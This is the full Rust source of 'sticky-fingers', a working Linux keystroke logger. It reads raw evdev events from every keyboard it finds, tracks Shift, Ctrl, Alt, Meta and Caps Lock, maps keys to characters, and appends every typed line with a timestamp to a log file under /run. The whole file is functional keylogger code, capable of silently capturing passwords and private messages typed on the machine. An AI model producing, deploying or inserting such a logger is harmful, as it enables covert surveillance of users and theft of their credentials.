// sticky-fingers — minimal evdev keystroke logger.
// Per-line timestamps (flushed on Enter), US keymap, modifier-aware.
// Writes to STICKY_FINGERS_PATH (default /run/sticky-fingers/session.log).

use std::env;
use std::fs::{File, OpenOptions};
use std::io::Write;
use std::path::PathBuf;
use std::sync::{Arc, Mutex};
use std::thread;

use chrono::Local;
use evdev::{Device, EventSummary, KeyCode};

const DEFAULT_LOG_PATH: &str = "/run/sticky-fingers/session.log";

struct LogState {
    file: File,
    buffer: String,
}

impl LogState {
    fn new(path: &str) -> std::io::Result<Self> {
        let file = OpenOptions::new()
            .create(true)
            .append(true)
            .open(path)?;
        Ok(Self { file, buffer: String::with_capacity(256) })
    }

    fn write_header(&mut self, devices: &[String]) {
        let ts = Local::now().format("%Y-%m-%d %H:%M:%S %z");
        let _ = writeln!(self.file, "=== sticky-fingers session started {ts} ===");
        for d in devices {
            let _ = writeln!(self.file, "=== device: {d} ===");
        }
        let _ = self.file.flush();
    }

    fn append(&mut self, s: &str) {
        self.buffer.push_str(s);
    }

    fn flush_line(&mut self) {
        let ts = Local::now().format("%H:%M:%S");
        let _ = writeln!(self.file, "{ts} {}", self.buffer);
        let _ = self.file.flush();
        self.buffer.clear();
    }
}

#[derive(Default)]
struct Modifiers {
    shift: u8,
    ctrl:  u8,
    alt:   u8,
    meta:  u8,
    caps:  bool,
}

impl Modifiers {
    fn shifted(&self)  -> bool { self.shift != 0 }
    fn ctrl_alt_meta(&self) -> bool { self.ctrl != 0 || self.alt != 0 || self.meta != 0 }

    fn prefix(&self) -> String {
        let mut p = String::new();
        if self.ctrl != 0 { p.push_str("Ctrl-"); }
        if self.alt  != 0 { p.push_str("Alt-");  }
        if self.meta != 0 { p.push_str("Meta-"); }
        p
    }

    // Returns Some(true=press, false=release) if key is a modifier, else None.
    // Updates internal state and returns whether handled.
    fn update(&mut self, key: KeyCode, pressed: bool) -> bool {
        let toggle_bit = |field: &mut u8, b: u8| {
            if pressed { *field |= b } else { *field &= !b };
        };
        match key {
            KeyCode::KEY_LEFTSHIFT  => { toggle_bit(&mut self.shift, 0b01); true }
            KeyCode::KEY_RIGHTSHIFT => { toggle_bit(&mut self.shift, 0b10); true }
            KeyCode::KEY_LEFTCTRL   => { toggle_bit(&mut self.ctrl,  0b01); true }
            KeyCode::KEY_RIGHTCTRL  => { toggle_bit(&mut self.ctrl,  0b10); true }
            KeyCode::KEY_LEFTALT    => { toggle_bit(&mut self.alt,   0b01); true }
            KeyCode::KEY_RIGHTALT   => { toggle_bit(&mut self.alt,   0b10); true }
            KeyCode::KEY_LEFTMETA   => { toggle_bit(&mut self.meta,  0b01); true }
            KeyCode::KEY_RIGHTMETA  => { toggle_bit(&mut self.meta,  0b10); true }
            KeyCode::KEY_CAPSLOCK   => { if pressed { self.caps = !self.caps; } true }
            _ => false,
        }
    }
}

enum Translated {
    /// A typeable character (case affected by shift XOR caps for letters).
    Char(&'static str, &'static str),
    /// A special key — emitted as <Name>.
    Special(&'static str),
}

fn translate(key: KeyCode) -> Option<Translated> {
    use evdev::KeyCode as KC;
    use Translated::{Char as C, Special as S};
    Some(match key {
        // Letters (lower, upper)
        KC::KEY_A => C("a","A"), KC::KEY_B => C("b","B"), KC::KEY_C => C("c","C"),
        KC::KEY_D => C("d","D"), KC::KEY_E => C("e","E"), KC::KEY_F => C("f","F"),
        KC::KEY_G => C("g","G"), KC::KEY_H => C("h","H"), KC::KEY_I => C("i","I"),
        KC::KEY_J => C("j","J"), KC::KEY_K => C("k","K"), KC::KEY_L => C("l","L"),
        KC::KEY_M => C("m","M"), KC::KEY_N => C("n","N"), KC::KEY_O => C("o","O"),
        KC::KEY_P => C("p","P"), KC::KEY_Q => C("q","Q"), KC::KEY_R => C("r","R"),
        KC::KEY_S => C("s","S"), KC::KEY_T => C("t","T"), KC::KEY_U => C("u","U"),
        KC::KEY_V => C("v","V"), KC::KEY_W => C("w","W"), KC::KEY_X => C("x","X"),
        KC::KEY_Y => C("y","Y"), KC::KEY_Z => C("z","Z"),

        // Number row
        KC::KEY_GRAVE => C("`","~"),
        KC::KEY_1 => C("1","!"), KC::KEY_2 => C("2","@"), KC::KEY_3 => C("3","#"),
        KC::KEY_4 => C("4","$"), KC::KEY_5 => C("5","%"), KC::KEY_6 => C("6","^"),
        KC::KEY_7 => C("7","&"), KC::KEY_8 => C("8","*"), KC::KEY_9 => C("9","("),
        KC::KEY_0 => C("0",")"),
        KC::KEY_MINUS => C("-","_"), KC::KEY_EQUAL => C("=","+"),

        // Punctuation
        KC::KEY_LEFTBRACE  => C("[","{"),
        KC::KEY_RIGHTBRACE => C("]","}"),
        KC::KEY_BACKSLASH  => C("\\","|"),
        KC::KEY_SEMICOLON  => C(";",":"),
        KC::KEY_APOSTROPHE => C("'","\""),
        KC::KEY_COMMA      => C(",","<"),
        KC::KEY_DOT        => C(".",">"),
        KC::KEY_SLASH      => C("/","?"),
        KC::KEY_SPACE      => C(" "," "),

        // Whitespace / control
        KC::KEY_TAB       => S("Tab"),
        KC::KEY_ESC       => S("Esc"),
        KC::KEY_BACKSPACE => S("BS"),

        // Navigation
        KC::KEY_LEFT     => S("Left"),
        KC::KEY_RIGHT    => S("Right"),
        KC::KEY_UP       => S("Up"),
        KC::KEY_DOWN     => S("Down"),
        KC::KEY_HOME     => S("Home"),
        KC::KEY_END      => S("End"),
        KC::KEY_PAGEUP   => S("PgUp"),
        KC::KEY_PAGEDOWN => S("PgDn"),
        KC::KEY_INSERT   => S("Ins"),
        KC::KEY_DELETE   => S("Del"),

        // Function keys
        KC::KEY_F1  => S("F1"),  KC::KEY_F2  => S("F2"),  KC::KEY_F3  => S("F3"),
        KC::KEY_F4  => S("F4"),  KC::KEY_F5  => S("F5"),  KC::KEY_F6  => S("F6"),
        KC::KEY_F7  => S("F7"),  KC::KEY_F8  => S("F8"),  KC::KEY_F9  => S("F9"),
        KC::KEY_F10 => S("F10"), KC::KEY_F11 => S("F11"), KC::KEY_F12 => S("F12"),

        _ => return None,
    })
}

fn is_keyboard(dev: &Device) -> bool {
    dev.supported_keys()
        .map(|k| k.contains(KeyCode::KEY_A) && k.contains(KeyCode::KEY_Z))
        .unwrap_or(false)
}

fn find_keyboards() -> Vec<(PathBuf, Device)> {
    evdev::enumerate()
        .filter(|(_, d)| is_keyboard(d))
        .collect()
}

fn run_device(path: PathBuf, mut dev: Device, log: Arc<Mutex<LogState>>) {
    let mut mods = Modifiers::default();

    loop {
        let events = match dev.fetch_events() {
            Ok(e)  => e,
            Err(e) => {
                eprintln!("sticky-fingers: {} fetch_events: {e}", path.display());
                return;
            }
        };

        for ev in events {
            // value: 0 release, 1 press, 2 repeat. Modifiers track on press/release;
            // characters emit on press+repeat.
            let (key, value) = match ev.destructure() {
                EventSummary::Key(_, code, value) => (code, value),
                _ => continue,
            };
            let pressed = value != 0;

            if mods.update(key, pressed) { continue; }
            if !pressed { continue; } // emit only on press/repeat

            // Enter is special: flush the current line (unless ctrl/alt/meta held).
            if key == KeyCode::KEY_ENTER {
                let mut guard = log.lock().unwrap();
                if mods.ctrl_alt_meta() {
                    guard.append(&format!("<{}Enter>", mods.prefix()));
                } else {
                    guard.flush_line();
                }
                continue;
            }

            let Some(t) = translate(key) else { continue };
            let lit = match t {
                Translated::Char(lo, hi) => {
                    // Letter case = shift XOR caps; symbols ignore caps.
                    let is_letter = lo.chars().next().map(|c| c.is_ascii_alphabetic()).unwrap_or(false);
                    let upper = if is_letter {
                        mods.shifted() ^ mods.caps
                    } else {
                        mods.shifted()
                    };
                    let s = if upper { hi } else { lo };
                    if mods.ctrl_alt_meta() {
                        format!("<{}{}>", mods.prefix(), s)
                    } else {
                        s.to_string()
                    }
                }
                Translated::Special(name) => {
                    if mods.ctrl_alt_meta() {
                        format!("<{}{}>", mods.prefix(), name)
                    } else {
                        format!("<{}>", name)
                    }
                }
            };

            let mut guard = log.lock().unwrap();
            guard.append(&lit);
        }

    }
}

fn main() -> std::io::Result<()> {
    let path = env::var("STICKY_FINGERS_PATH").unwrap_or_else(|_| DEFAULT_LOG_PATH.to_string());

    let kbds = find_keyboards();
    if kbds.is_empty() {
        eprintln!("sticky-fingers: no keyboards found under /dev/input");
        std::process::exit(1);
    }

    let mut state = LogState::new(&path)?;
    let names: Vec<String> = kbds.iter()
        .map(|(p, d)| format!("{} ({})", d.name().unwrap_or("?"), p.display()))
        .collect();
    state.write_header(&names);

    let log = Arc::new(Mutex::new(state));
    let mut handles = Vec::new();
    for (p, d) in kbds {
        let log = Arc::clone(&log);
        handles.push(thread::spawn(move || run_device(p, d, log)));
    }
    for h in handles { let _ = h.join(); }
    Ok(())
}
